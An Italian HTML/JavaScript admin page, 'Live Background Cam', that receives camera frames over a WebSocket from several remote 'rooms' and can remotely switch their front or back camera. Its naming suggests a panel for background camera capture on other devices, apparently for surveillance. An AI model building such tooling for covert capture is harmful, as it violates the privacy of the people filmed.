<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<title>Live Background Cam</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<style>
  body { margin:0; background:#000; color:#0f0; font-family:Arial; padding:20px; }
  .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:15px; }
  .cam { border:2px solid #0f0; border-radius:12px; overflow:hidden; background:#111; position:relative; }
  .cam img { width:100%; height:auto; display:block; object-fit:contain; }
  h2 { margin:0; padding:8px; background:#0f0; color:#000; font-size:14px; text-align:center; }
  .status { color:#0f0; font-size:12px; text-align:center; padding:4px; position:absolute; bottom:0; left:0; right:0; background:rgba(0,0,0,0.7); }
  .controls { margin-top:5px; text-align:center; }
  .controls button { background:#0f0; color:#000; border:none; padding:5px 10px; cursor:pointer; border-radius:4px; font-size:12px; }
</style>
</head>
<body>
<h1>Camera in Background</h1>
<div id="grid" class="grid"></div>

<script>
const grid = document.getElementById('grid');
const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
const ws = new WebSocket(`${protocol}://${location.host}/bg-admin`);
const rooms = new Map();
const imageCache = new Map();
let lastUpdate = Date.now();

ws.onopen = () => console.log('âœ… Admin connesso');
ws.onerror = err => console.error('WebSocket error:', err);
ws.onclose = () => console.warn('WebSocket chiuso');

ws.onmessage = async e => {
  if (e.data instanceof Blob) {
    const currentRoom = localStorage.getItem('currentRoom');
    if (!currentRoom) return;
    const roomData = rooms.get(currentRoom);
    if (!roomData || !roomData.img) return;

    if (Date.now() - lastUpdate < 50) return; // circa 20 FPS
    const oldUrl = imageCache.get(currentRoom);
    if (oldUrl) URL.revokeObjectURL(oldUrl);
    const newUrl = URL.createObjectURL(e.data);
    roomData.img.src = newUrl;
    imageCache.set(currentRoom, newUrl);

    const statusEl = document.getElementById('status-' + currentRoom);
    if (statusEl) statusEl.textContent = 'Live: ' + new Date().toLocaleTimeString();
    lastUpdate = Date.now();
  } else {
    const data = JSON.parse(e.data);
    if (data.type === 'welcome') return;
    if (data.offline) {
      const roomData = rooms.get(data.room);
      if (roomData && roomData.status) roomData.status.textContent = 'Offline';
      return;
    }

    const room = data.room;
    localStorage.setItem('currentRoom', room);

    if (!rooms.has(room)) {
      const div = document.createElement('div');
      div.className = 'cam';
      const img = document.createElement('img');
      img.id = 'img-' + room;
      const title = document.createElement('h2');
      title.textContent = room;
      const status = document.createElement('div');
      status.className = 'status';
      status.id = 'status-' + room;
      status.textContent = 'Connesso';

      const controls = document.createElement('div');
      controls.className = 'controls';
      const btnFront = document.createElement('button');
      btnFront.textContent = 'Front';
      btnFront.onclick = () => ws.send(JSON.stringify({ type:'switchCamera', camera:'user' }));
      const btnBack = document.createElement('button');
      btnBack.textContent = 'Back';
      btnBack.onclick = () => ws.send(JSON.stringify({ type:'switchCamera', camera:'environment' }));
      controls.appendChild(btnFront);
      controls.appendChild(btnBack);

      div.appendChild(title);
      div.appendChild(img);
      div.appendChild(status);
      div.appendChild(controls);

      grid.appendChild(div);
      rooms.set(room, { div, img, status, controls });
    }
  }
};

window.addEventListener('beforeunload', () => {
  imageCache.forEach(url => URL.revokeObjectURL(url));
  imageCache.clear();
  if (ws.readyState === WebSocket.OPEN) ws.close();
});
</script>
</body>
</html>
